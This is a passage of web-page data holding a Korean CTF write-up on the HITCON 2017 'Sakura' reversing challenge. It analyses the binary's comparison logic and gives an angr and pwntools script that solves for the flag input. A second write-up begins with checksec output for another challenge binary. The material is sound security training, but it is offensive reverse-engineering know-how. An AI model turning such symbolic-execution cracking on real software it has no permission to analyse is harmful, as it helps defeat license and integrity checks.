url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAABCklEQVQY022Q65KDIAxG+/4PuHWdqkWpVUQrVAJRIDv0urfzM8nJl8lOygBAMRIRbRsZQ97TPDutnVJWawwh9eJP6MauKEKeU10TY4R4L5KURms3CMjrplYMrFPKWAvWWgDYtu0hH4/hcKDTiaRMyfel42iWBUUPh3rIRTVdlhV9jDHceCczFjmnYXjEPmUwBnthes7ddXQuGoPWWvfkIZdlOnu/T/53eZ5tL1ByeR3VuQOtfQjBe/+KTTLnoarS2UKkV92ZJquUPXH8rC6NaofLjIjOIQD41xDRrm1DWRLn1DS0ru+HGbP23ZKx415+tKMMFOgPSS6KJHP+S8bubDLWZDLrpjH+J38BKR7MJkN0EigAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./7.png\"\n        title=\"./7.png\"\n        src=\"/static/bb1a74fa4329a40fcf42439525441c82/738b8/7.png\"\n        srcset=\"/static/bb1a74fa4329a40fcf42439525441c82/e9ff0/7.png 180w,\n/static/bb1a74fa4329a40fcf42439525441c82/f21e7/7.png 360w,\n/static/bb1a74fa4329a40fcf42439525441c82/738b8/7.png 639w\"\n        sizes=\"(max-width: 639px) 100vw, 639px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>처음 프롤로그 부분에서 스택 영역을 <code class=\"language-text\">0x1E60</code> 만큼이나 할당해준 후 무수히 많은 변수에 값을 대입하고 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 717px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 45.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAABKUlEQVQoz12Q13KDMBAA+f8PdDyOGzhgigSo36ldBheCs0/SzexoT8XlQn1PdU1aZ+8jESmFUiLntixFxdrrdHWAmXJIIaaYcqI3RVkS4nLK+TXSGrVGxm3X6ZxzTBHfgIOUNvJuR9P0ujz9eQbObdPIuhHeJ0TPOZ+myRgTY6QNRV2TlKQ1AWxf9sNgy5r9DINUxhhtH/yXAcg5MoacS4wZgJAzxZi9T4DBopud4HZUXimvBjMoVH/y4UBdR/c7rbsIAfPs+l63ncTgITjvQ84ppZTXj3nK+/3SjEhrkRAgJdwbda1GFwDAW+v0AwDYlhfHI91udDqReudIuchdq7+r+qs7nJtWSoO4aCGED7ksqWmoqpbNV3kcLWP2dGsHy4Qys5g/e1/yL7wcCMl/uD6iAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./8.png\"\n        title=\"./8.png\"\n        src=\"/static/3bd856661e7f77dc51c2cae7c5c0aee2/0ad97/8.png\"\n        srcset=\"/static/3bd856661e7f77dc51c2cae7c5c0aee2/e9ff0/8.png 180w,\n/static/3bd856661e7f77dc51c2cae7c5c0aee2/f21e7/8.png 360w,\n/static/3bd856661e7f77dc51c2cae7c5c0aee2/0ad97/8.png 717w\"\n        sizes=\"(max-width: 717px) 100vw, 717px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>비슷한 구조로 한 블록에서 루프를 돌면서 비교를 한 후에 같지 않을 경우 <code class=\"language-text\">mov [rbp+var_1E49], 0</code> 과정을 하는 패턴이 계속 보이는 것을 확인할 수 있으며,</li>\n<li>같을 경우 <code class=\"language-text\">mov [rbp+var_1E48], 0</code> 패턴을 진행하며 함수의 ret 까지 계속 진행한다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 714px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 35.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAABDElEQVQY00WPWW7DMAxEff8rJo3brLZlR6JEbZRIFgncZjC/D29mWFdE1Fo1JXEuAxQRqbUTccASMvoUV1wXWLaw3e198Qsx6TvD9zder+q9AGjvoqpEbG0OgQ7jcpwul8WkHGN6FRE7d/3L4H0qRd8Va7NzWVVLaUScS0ulhhpMXG2ykMBEM/mptrrDxyMdDros6tzHbEyMsZ7P8HW7PWD2iD54AIgxppxEZIfHEadJASSlfUxr/fmMiHQ64fgDj3vxLjjrnHU5Zu4sIsz8gmPcIWZBrACl1tY7M0tr2ppS65DBFx9KgAIuO+qkb/dgzAeutefciPo8I/O+rfVmnmZ16+a2eZvnbf7//At4hpM9WPL6VQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./9.png\"\n        title=\"./9.png\"\n        src=\"/static/8cc51a04cf277bb40fc81c7f5f34179c/d67ca/9.png\"\n        srcset=\"/static/8cc51a04cf277bb40fc81c7f5f34179c/e9ff0/9.png 180w,\n/static/8cc51a04cf277bb40fc81c7f5f34179c/f21e7/9.png 360w,\n/static/8cc51a04cf277bb40fc81c7f5f34179c/d67ca/9.png 714w\"\n        sizes=\"(max-width: 714px) 100vw, 714px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>결과적으로 반환 되는 함수의 값을 확인해 본 결과 마찬가지로 동일한 패턴으로 되는 것을 알 수 있으며 우리는 해당 반환 값이 0이 아니라 입력 한 값을 바탕으로 해당 함수의 로직으로 생신 값이 필요하기에 <code class=\"language-text\">movzx eax, [rbp+var_1E49]</code> 조건으로 점프할 수 있는 조건이 필요하다.</li>\n</ul>\n<h1 id=\"해결-방안\" style=\"position:relative;\"><a href=\"#%ED%95%B4%EA%B2%B0-%EB%B0%A9%EC%95%88\" aria-label=\"해결 방안 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>해결 방안</h1>\n<h2 id=\"solved-code\" style=\"position:relative;\"><a href=\"#solved-code\" aria-label=\"solved code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Solved Code</h2>\n<ul>\n<li>해당 문제를 풀기 위해 angr 모듈을 사용할 것이다. <code class=\"language-text\">sub_850</code> 함수의 조건을 명제 논리식으로 판단하기 위해 <code class=\"language-text\">Boolean SATisfiability problem</code> 방식으로 접근해야 한다.</li>\n<li>True가 될 조건은 <code class=\"language-text\">jz</code> 분기로 점프한 <code class=\"language-text\">mov eax, []</code> 부분일 것이고</li>\n<li>False가 될 조건은 <code class=\"language-text\">jz</code> 분기로 점프를 하지 않은 <code class=\"language-text\">mov [rbp+var_1E49], 0</code> 해당 부분이 될 것이다.</li>\n<li>피해해야 할 부분의 False는 아주 고맙게도 같은 <code class=\"language-text\">C6 85 B7 E1 FF FF 00</code> 바이트이며</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAABTElEQVQY04WMy07CQBiF+yw+gg/kyp1v4CO4cKUbI4oxcWdCRKPRBQm9gJiwUBRipoUpTClTptN22qHtlI7h4saNX3L+zTnfr5gjqLbf9bePAWAklFKWmxBKGQvjOJFFXu14BzX3oc9W1arfooCbK/1ov328N6xWgno7e24UTy/lfT38+trMclHEPP2jbWWrctq6231t7Di1w+D8kV7e8otrdnIWdrv/y6D3qWqa0Wl996YEJjmNZBSVYUgxTjhfLDhjMfaDgMU0inkmkkWWpPnmKsCyVFU1dK0/mMOJdL1SFKuv2PNs23Ycx3WnAAAI4Xg8Jr/4vk8IUUwANE01DG00miMk8WxZiGVZLmcYIzSZOg5CiBBCKSWEWEPLtm3TNCGEAAAFANBsNnVdd12SpjLLyiQRnAs8w0PLQghRSqMoomuyLBNr8jwXQvwAJaZ5zmDimo8AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./10.png\"\n        title=\"./10.png\"\n        src=\"/static/70f61871d08e0ef5cccd1b9630fbb94d/37523/10.png\"\n        srcset=\"/static/70f61871d08e0ef5cccd1b9630fbb94d/e9ff0/10.png 180w,\n/static/70f61871d08e0ef5cccd1b9630fbb94d/f21e7/10.png 360w,\n/static/70f61871d08e0ef5cccd1b9630fbb94d/37523/10.png 720w,\n/static/70f61871d08e0ef5cccd1b9630fbb94d/0eb6d/10.png 913w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>오프셋 차이가 <code class=\"language-text\">7</code> 차이가 나기때문에 False의 주소 + 7을 하여 True를 구해내야 하며 또한 허용해야 할 주소 값이 계산되서 나왔다면 전부 값에 넣을 것이 아니라</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 50%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABgUlEQVQoz22QOXMTURCE9dvJSCCBPwDGpmQJk1Ng2ZkzSU8rBwIXK8prXbt698y7ZigfgTHq6mzqq+nuXlVVFxeX1/OZMT+s/ar1jTEUUw4ha+ukV53fm2AkSImSmPiZerPZbDQ6F2LeNKwUIxIReZ+sjU1jtrrTqIko5hhz5H/1BI/Hs+Uyl1KYCzMbE9rW396qUhg8aKUDBCp0EB5Np5Pd9grgPISmFEZMzqX1Vm/2UjttnYUAqaTDn4WoNhvfts579D4BJOfiXnoXvUIFCWywBs3LzkKIx9h1Td5zSvdna4OUuPwjHQJiRMSA4aHUodiTSbVYlLoma+9hbbBr4Wd9t1j/3nYyp0REpRSiF2tPx6Pv3+ZiahR7wxFTBAw+gEW5NwHBGA3gED2go5Q4Zc5P7ombu9HVtfi1WuncYVSxROZA7DOvIa4CypIVp46Co/9iV2/fXb56Ld683x2d7T8N1ce+/3CC/aHvn8mTL+2gvzs9ksPP3eC4HRzTYMDP/BfnmCndJQG5DgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./11.png\"\n        title=\"./11.png\"\n        src=\"/static/22da3ca737e8d83b0278c59dac031594/37523/11.png\"\n        srcset=\"/static/22da3ca737e8d83b0278c59dac031594/e9ff0/11.png 180w,\n/static/22da3ca737e8d83b0278c59dac031594/f21e7/11.png 360w,\n/static/22da3ca737e8d83b0278c59dac031594/37523/11.png 720w,\n/static/22da3ca737e8d83b0278c59dac031594/6bfd0/11.png 1011w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>첫 번째 , 두 번째 조건은 건너 뛰고 세 번째 부분을 허용 값에 넣어야 한다.</li>\n<li>그러면 이제 Solve 를 작성해보자</li>\n</ul>\n<h2 id=\"solved-code-1\" style=\"position:relative;\"><a href=\"#solved-code-1\" aria-label=\"solved code 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Solved Code 1</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> angr\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\nPATH<span class=\"token operator\">=</span><span class=\"token string\">'./sakura'</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> PATH\n\t\t<span class=\"token comment\"># 바이트로 읽어오도록 한다.</span>\n    data <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./sakura\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"rb\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    find_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    avoid_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    idx <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    cnt <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n\t\t\t\t<span class=\"token comment\"># avoid 할 패턴</span>\n        res <span class=\"token operator\">=</span> data<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span><span class=\"token string\">b\"\\xC6\\x85\\xB7\\xE1\\xFF\\xFF\\x00\"</span><span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> res <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">break</span>\n        <span class=\"token comment\"># 베이스 주소는 0x100000을 하든 상관 없다.</span>\n        avoid_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">0x400000</span> <span class=\"token operator\">+</span> res<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\"># find 조건 </span>\n        <span class=\"token keyword\">if</span> cnt <span class=\"token operator\">%</span> <span class=\"token number\">3</span> <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span>\n            find_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">0x400000</span> <span class=\"token operator\">+</span> res <span class=\"token operator\">+</span> <span class=\"token number\">7</span><span class=\"token punctuation\">)</span>\n            \n        cnt <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n        idx <span class=\"token operator\">=</span> res <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token comment\"># aovid 패턴의 오프셋만큼 더해가면서 다음 오프셋을 찾아낸다.</span>\n\n    p <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span><span class=\"token string\">'./sakura'</span><span class=\"token punctuation\">)</span>\n    state <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>entry_state<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">for</span> find <span class=\"token keyword\">in</span> find_list<span class=\"token punctuation\">:</span>\n        sm<span class=\"token operator\">=</span>p<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span>\n\t\t\t\t<span class=\"token comment\"># 순차적으로 find조건을 만족 하는지르 확인하기 위해 for문을 돌렸다.</span>\n\t\t\t\t<span class=\"token comment\"># 루프를 돌리지 않고 한번에 바로 해도 된다.</span>\n        sm<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span>find<span class=\"token punctuation\">,</span> avoid<span class=\"token operator\">=</span>avoid_list<span class=\"token punctuation\">)</span>\n        state<span class=\"token operator\">=</span>sm<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n\t\t\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span>\n        \n    p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span>PATH<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 프로세스 attach</span>\n    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 출력 값을 read 함수로 보내버린다.</span>\n    flag <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 응답 받고 출력</span>\n    log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token builtin\">repr</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 13.333333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAp0lEQVQI1wXBRxKCMBQAUC7CDMRQIqFD+Gm0GCwgegHGnRvvv/c9x67P27av28s+dvo+GtkDiI6rpoWiahoGVc2k6oXUHOQnNL/wfkA8Y+8bWGcAOU5WjhbUJOXAOsHSsi3qnNAkIDQkWUTyIEpxHJwihJGLfc+LTjh2MXJKNmqz6ukCeub9zJTJuc3BVGJO2ZjxJRVXCgvtDMqUnwiUcD/hHmn9M/wBacYmNikvA6oAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./12.png\"\n        title=\"./12.png\"\n        src=\"/static/71183e88b5dfdc2f53a4363d5e602736/37523/12.png\"\n        srcset=\"/static/71183e88b5dfdc2f53a4363d5e602736/e9ff0/12.png 180w,\n/static/71183e88b5dfdc2f53a4363d5e602736/f21e7/12.png 360w,\n/static/71183e88b5dfdc2f53a4363d5e602736/37523/12.png 720w,\n/static/71183e88b5dfdc2f53a4363d5e602736/eafa0/12.png 939w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EC%8B%A4%ED%96%89-%EA%B2%B0%EA%B3%BC\">바이너리 실행 결과</a></li>\n<li><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EC%A0%95%EB%B3%B4\">바이너리 정보</a></li>\n<li><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\">main 함수 분석</a></li>\n<li><a href=\"#sub_850-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\">sub_850 함수 분석</a></li>\n<li><a href=\"#solved-code\">Solved Code</a></li>\n<li><a href=\"#solved-code-1\">Solved Code 1</a></li>\n</ul>\n</div>","frontmatter":{"date":"August 16, 2020","title":"HitCon2017 Sakura 취약점 분석","categories":"CTF","author":"Zer0Luck","emoji":"🥞"},"fields":{"slug":"/hitcon2017_sakura_ctf_writeup/2020-08-16-HITCON2017-sakura/"}},"prev":{"id":"6d7e1b46-3ef9-5d9e-a0c2-c2b3a0e503d5","html":"<h1 id=\"취약점-분석\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"취약점 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석</h1>\n<h2 id=\"바이너리-개요\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EA%B0%9C%EC%9A%94\" aria-label=\"바이너리 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>바이너리 개요</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>traveller<span class=\"token operator\">:</span> ELF <span class=\"token number\">64</span><span class=\"token operator\">-</span>bit LSB executable\nx86<span class=\"token operator\">-</span><span class=\"token number\">64</span>\nversion <span class=\"token number\">1</span> <span class=\"token punctuation\">(</span>SYSV<span class=\"token punctuation\">)</span>\ndynamically linked\ninterpreter <span class=\"token operator\">/</span>lib64<span class=\"token operator\">/</span>ld<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>x86<span class=\"token operator\">-</span><span class=\"token number\">64.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">2</span>\n<span class=\"token keyword\">for</span> GNU<span class=\"token operator\">/</span>Linux <span class=\"token number\">2.6</span><span class=\"token punctuation\">.</span><span class=\"token number\">32</span>\nBuildID<span class=\"token punctuation\">[</span>sha1<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>b551cbb805a21e18393c3816ffd28dfb11b1ff1e\nwith debug_info\n<span class=\"token operator\">not</span> stripped\n\nlinux<span class=\"token operator\">-</span>vdso<span class=\"token punctuation\">.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">1</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x00007ffe8fb89000</span><span class=\"token punctuation\">)</span>\nlibc<span class=\"token punctuation\">.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">6</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token operator\">/</span>lib<span class=\"token operator\">/</span>x86_64<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>gnu<span class=\"token operator\">/</span>libc<span class=\"token punctuation\">.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">6</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x00007f7aeab6c000</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">/</span>lib64<span class=\"token operator\">/</span>ld<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>x86<span class=\"token operator\">-</span><span class=\"token number\">64.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">2</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x00007f7aeaf5d000</span><span class=\"token punctuation\">)</span></code></pre></div>\n<h2 id=\"보호기법\" style=\"position:relative;\"><a href=\"#%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95\" aria-label=\"보호기법 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>보호기법</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">gdb<span class=\"token operator\">-</span>peda$ checksec \nCANARY    <span class=\"token operator\">:</span> disabled\nFORTIFY   <span class=\"token operator\">:</span> disabled\nNX        <span class=\"token operator\">:</span> ENABLED\nPIE       <span class=\"token operator\">:</span> disabled\nRELRO     <span class=\"token operator\">:</span> Partial</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">trip 구조체\n<span class=\"token operator\">=</span><span class=\"token operator\">></span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span> destination\n<span class=\"token operator\">=</span><span class=\"token operator\">></span>ssize_t distance\n\n<span class=\"token operator\">--</span> global variables <span class=\"token operator\">--</span>\nTRIPS_NUM <span class=\"token operator\">=</span> <span class=\"token number\">7</span>\nTOTAL_RUN <span class=\"token operator\">=</span> <span class=\"token number\">14</span>\ntrip<span class=\"token operator\">*</span> trips<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span>\ntIndex <span class=\"token operator\">=</span> <span class=\"token number\">0</span></code></pre></div>\n<h2 id=\"main-함수-분석\" style=\"position:relative;\"><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"main 함수 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" 